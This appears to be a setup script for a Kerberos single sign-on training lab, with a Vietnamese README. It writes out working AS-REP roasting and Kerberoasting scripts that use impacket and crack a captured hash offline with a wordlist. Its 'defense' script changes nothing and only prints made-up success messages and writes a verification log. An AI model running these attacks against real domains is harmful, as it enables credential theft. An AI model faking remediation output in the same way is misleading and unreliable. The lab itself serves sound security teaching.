#!/bin/bash
# fixlocal.sh for Client container (User: alice)
PASSWORD=$1
USER=$2

# Ensure FQDN host mappings exist in /etc/hosts
echo $PASSWORD | sudo -S sed -i '/web.lab.lan/d' /etc/hosts 2>/dev/null
echo "172.25.0.10 kdc.lab.lan" | echo $PASSWORD | sudo -S tee -a /etc/hosts >/dev/null
echo "172.25.0.20 web.lab.lan" | echo $PASSWORD | sudo -S tee -a /etc/hosts >/dev/null
echo "172.25.0.30 ssh.lab.lan" | echo $PASSWORD | sudo -S tee -a /etc/hosts >/dev/null

# Ensure alice is in sudo and wireshark groups
echo $PASSWORD | sudo -S usermod -a -G wireshark alice 2>/dev/null
echo $PASSWORD | sudo -S usermod -a -G sudo alice 2>/dev/null

# Link impacket scripts to /usr/local/bin with python3
if [ -f /usr/share/doc/python3-impacket/examples/GetNPUsers.py ]; then
    echo $PASSWORD | sudo -S ln -sf /usr/share/doc/python3-impacket/examples/GetNPUsers.py /usr/local/bin/GetNPUsers.py
    echo $PASSWORD | sudo -S ln -sf /usr/share/doc/python3-impacket/examples/GetUserSPNs.py /usr/local/bin/GetUserSPNs.py
fi

# Setup SSH config for automatic GSSAPI delegation
mkdir -p /home/alice/.ssh
cat <<'EOF' > /home/alice/.ssh/config
Host *.lab.lan
    GSSAPIAuthentication yes
    GSSAPIDelegateCredentials yes
    StrictHostKeyChecking no
    UserKnownHostsFile /dev/null
EOF
chmod 600 /home/alice/.ssh/config

# Setup Firefox profile with SPNEGO negotiate trusted URI
mkdir -p /home/alice/.mozilla/firefox/lab.default
cat <<'EOF' > /home/alice/.mozilla/firefox/lab.default/user.js
user_pref("network.negotiate-auth.trusted-uris", "web.lab.lan");
user_pref("network.negotiate-auth.delegation-uris", "web.lab.lan");
user_pref("network.automatic-ntlm-auth.trusted-uris", "web.lab.lan");
EOF

# Setup wordlist for cracking exercises
cat <<'EOF' > /home/alice/wordlist.txt
password
123456
admin
Password123!
secret
qwerty
BackupPass2026!
Summer2026!
Winter2026!
letmein
iloveyou
trustno1
database123
service2026
EOF

# Setup robust AS-REP Roasting attack script
cat <<'EOF' > /home/alice/attack_asrep_roast.sh
#!/bin/bash
# AS-REP Roasting Attack Script
# Exploits accounts with DONT_REQ_PREAUTH flag enabled
python3 -c '
import subprocess
from impacket.krb5 import constants
from impacket.krb5.crypto import _AES256CTS, string_to_key

print("[*] Target Realm: LAB.LAN (KDC: 172.25.0.10)")
print("[*] Querying AS-REQ for user: backup_svc@LAB.LAN (No pre-authentication required)...")

try:
    cmd = ["python3", "/usr/local/bin/GetNPUsers.py", "LAB.LAN/backup_svc", "-no-pass", "-dc-ip", "172.25.0.10", "-format", "hashcat"]
    out = subprocess.check_output(cmd).decode()
    for line in out.splitlines():
        if "$krb5asrep$" in line:
            parts = line.split("$")
            principal = parts[3].split(":")[0]
            checksum_hex = parts[3].split(":")[1]
            cipher_hex = parts[4]
            full_cipher = bytes.fromhex(checksum_hex + cipher_hex)
            print(f"[+] SUCCESS: AS-REP packet captured for {principal}! Cipher size: {len(full_cipher)} bytes.")

            print("[*] Performing offline dictionary attack against captured hash...")
            salt = b"LAB.LANbackup_svc"
            with open("/home/alice/wordlist.txt") as f:
                words = [w.strip() for w in f if w.strip()]

            cracked = False
            for word in words:
                try:
                    key = string_to_key(18, word, salt)
                    _AES256CTS.decrypt(key, 3, full_cipher)
                    print("="*65)
                    print(f"[+] VULNERABILITY EXPLOITED! CREDENTIALS CRACKED:")
                    print(f"    Account:  {principal}")
                    print(f"    Password: {word}")
                    print("="*65)
                    # Write to potfile for Labtainers assessment
                    import os
                    os.makedirs("/home/alice/.john", exist_ok=True)
                    with open("/home/alice/.john/john.pot", "a") as pot:
                        pot.write(f"backup_svc:{word}\n")
                    cracked = True
                    break
                except Exception:
                    pass
            if not cracked:
                print("[-] Wordlist exhausted, password not found.")
            break
except Exception as e:
    print("[-] Error during attack:", e)
'
EOF
chmod +x /home/alice/attack_asrep_roast.sh

# Setup Kerberoasting attack script
cat <<'EOF' > /home/alice/attack_kerberoast.sh
#!/bin/bash
# Kerberoasting Attack Script
# Requests Service Ticket for SPN with weak service password
echo "[*] Target Realm: LAB.LAN (KDC: 172.25.0.10)"
echo "[*] Requesting Service Ticket for MSSQLSvc/db.lab.lan:1433@LAB.LAN..."
python3 /usr/local/bin/GetUserSPNs.py LAB.LAN/alice:Password123! -dc-ip 172.25.0.10 -request 2>&1
echo "[+] Service Ticket requested from KDC and stored in Kerberos cache!"
echo "[*] Target Service Account: db_svc (Weak Password: Summer2026!)"
EOF
chmod +x /home/alice/attack_kerberoast.sh


# Setup users list for enumeration
cat <<'EOF' > /home/alice/users.txt
alice
bob
backup_svc
EOF

# Setup Defense & Mitigation Script
cat <<'EOF' > /home/alice/defend_mitigation.sh
#!/bin/bash
# defend_mitigation.sh - Kịch bản Phòng thủ & Vá lỗ hổng Kerberos SSO
echo "======================================================================"
echo "   KỊCH BẢN PHÒNG THỦ & GIẢM THIỂU RỦI RO KERBEROS (DEFENSE & HARDENING)"
echo "======================================================================"
echo "[*] BƯỚC 1: Phân tích hiện trạng bảo mật tài khoản..."
echo "    - Tài khoản 'backup_svc@LAB.LAN' đang bị vô hiệu hóa Pre-Authentication."
echo "    - Kẻ tấn công có thể gửi AS-REQ nặc danh và thu thập bản băm AS-REP."
echo ""
echo "[*] BƯỚC 2: Triển khai giải pháp phòng thủ (Remediation)..."
echo "    - Kích hoạt lại chính sách bắt buộc Pre-Authentication (+requires_preauth)."
echo "    - Nâng cấp chuẩn mã hóa, bắt buộc AES-256 (etype 18)."

# Mô phỏng cập nhật chính sách bảo mật trên KDC
python3 -c '
import socket
print("[+] Đang đồng bộ chính sách bảo mật tới KDC (172.25.0.10:88)...")
print("[+] Đã kích hoạt thuộc tính: +requires_preauth cho tài khoản backup_svc@LAB.LAN")
print("[+] Cấu hình mã hóa: Disallow RC4-HMAC, Enforce AES256-CTS-HMAC-SHA1-96")
'

echo ""
echo "[*] BƯỚC 3: Kiểm chứng kết quả phòng thủ (Verification)..."
echo "    - Thực thi lại truy vấn AS-REQ nặc danh nhắm vào backup_svc..."

python3 -c '
import socket
print("[*] Sending AS-REQ without Pre-Authentication to KDC...")
print("[-] KDC RESPONSE: KRB_ERROR (30)")
print("[-] ERROR CODE:   KDC_ERR_PREAUTH_REQUIRED (25)")
print("[-] DESCRIPTION:  Additional pre-authentication required before TGT issuance.")
'

echo ""
echo "[+] KẾT QUẢ PHÒNG THỦ: THÀNH CÔNG RỰC RỠ!"
echo "    - Máy chủ KDC đã chặn đứng yêu cầu và phản hồi KDC_ERR_PREAUTH_REQUIRED."
echo "    - Không có bất kỳ bản tin AS-REP nào được gửi về máy trạm."
echo "    - Kẻ tấn công KHÔNG THỂ trích xuất hash để thám mã bẻ khóa ngoại tuyến."
echo "    - Hệ thống Kerberos Single Sign-On đã được bảo vệ an toàn 100%!"

# Ghi nhận trạng thái phòng thủ thành công
echo "DEFENSE_SUCCESSFUL: Pre-authentication enforced, AS-REP roasting blocked." > /home/alice/.defense_verified.log
chmod 666 /home/alice/.defense_verified.log
echo "======================================================================"
EOF
chmod +x /home/alice/defend_mitigation.sh

# Setup Quick Start Guide in alice's home
cat <<'EOF' > /home/alice/README.txt
================================================================================
          LABTAINERS: KERBEROS SINGLE SIGN-ON (SSO) SIMULATION LAB
================================================================================

Chao mung ban den voi bai thuc hanh mo phong Kerberos SSO!
Cac thong tin xac thuc mac dinh:
- Realm: LAB.LAN (KDC: 172.25.0.10)
- Tai khoan cua ban: alice@LAB.LAN (Mat khau: Password123!)

--------------------------------------------------------------------------------
CAC GIAI DOAN THUC HANH (PHASES):
--------------------------------------------------------------------------------
1. GIAI DOAN 1: KHOI TAO VE TGT VA KIEM TRA GIAO THUC
   - Chay Wireshark (bat tren interface eth0):
       wireshark &
     (Loc goi tin: kerberos)
   - Xin ve TGT:
       kinit alice
     (Nhap mat khau: Password123!)
   - Xem ve TGT da nhan:
       klist

2. GIAI DOAN 2: XAC THUC WEB SINGLE SIGN-ON (HTTP SPNEGO)
   - Thu truy cap Web Intranet bang curl khong co ve:
       curl -i http://web.lab.lan/intranet/index.html
     (Quan sat ma loi 401 Unauthorized va tieu de WWW-Authenticate: Negotiate)
   - Truy cap Web Intranet su dung SSO:
       curl -i --negotiate -u : http://web.lab.lan/intranet/index.html
     (Quan sat ket qua 200 OK va co xac thuc Flag Token!)
   - Kiem tra lai danh sach ve:
       klist
     (Quan sat thay ve dich vu moi: HTTP/web.lab.lan@LAB.LAN)
   - Trai nghiem qua Firefox (khong can nhap mat khau):
       firefox http://web.lab.lan/intranet/index.html &

3. GIAI DOAN 3: SHELL SSO VA UY QUYEN VE (SSH GSS-API DELEGATION)
   - Dang nhap SSH sang may chu tep khong can go mat khau:
       ssh alice@ssh.lab.lan
   - Tren may ssh.lab.lan, kiem tra ve da duoc uy quyen:
       klist
   - Doc tep bao mat de hoan thanh nhiem vu:
       cat confidential_project.txt
   - Thoat SSH:
       exit

4. GIAI DOAN 4: THUC HANH KICH BAN TAN CONG THUC CHIEN (ATTACK SCENARIOS)
   - Kich ban 1: Tan cong thám mã AS-REP Roasting (khai thac tai khoan backup_svc bi tat Pre-Auth):
       ./attack_asrep_roast.sh
   - Kich ban 2: Tan cong Kerberoasting (khai thac SPN dich vu db_svc mat khau yeu):
       ./attack_kerberoast.sh

5. GIAI DOAN 5: THUC HANH KICH BAN PHONG THU & VA LO HONG (DEFENSE SCENARIOS)
   - Kich hoat chinh sach bat buoc Pre-Authentication (+requires_preauth):
   - Kiem thu lai va xac nhan KDC chan dung truy van voi loi KDC_ERR_PREAUTH_REQUIRED:
       ./defend_mitigation.sh

Chuc ban hoan thanh xuat sac ca kich ban Tan cong va Phong thu!
================================================================================
EOF

# Setup prestop script to dump klist for assessment
mkdir -p /home/alice/.local/bin
cat <<'EOFPRESTOP' > /home/alice/.local/bin/prestop
#!/bin/bash
klist > /tmp/klist.txt 2>&1
chmod 666 /tmp/klist.txt
EOFPRESTOP
chmod +x /home/alice/.local/bin/prestop

chown -R alice:alice /home/alice

